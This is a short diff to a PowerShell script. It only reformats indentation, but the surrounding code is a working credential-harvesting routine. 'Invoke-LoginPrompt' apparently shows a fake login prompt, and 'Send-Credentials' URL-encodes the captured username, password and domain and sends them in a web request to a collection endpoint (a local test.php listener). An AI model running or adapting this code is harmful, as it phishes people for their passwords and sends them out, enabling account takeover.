@@ -30,8 +30,8 @@ function Invoke-LoginPrompt{
 function Send-Credentials($username, $password, $domain)
 {
     $username = [System.Web.HttpUtility]::UrlEncode($username);
-	$password = [System.Web.HttpUtility]::UrlEncode($password);
-	$domain = [System.Web.HttpUtility]::UrlEncode($domain);
+    $password = [System.Web.HttpUtility]::UrlEncode($password);
+    $domain = [System.Web.HttpUtility]::UrlEncode($domain);
     Invoke-WebRequest -Uri "http://127.0.0.1:8080/test.php?dom=$domain&user=$username&pass=$password"
 }
 Invoke-LoginPrompt Send-Credentials
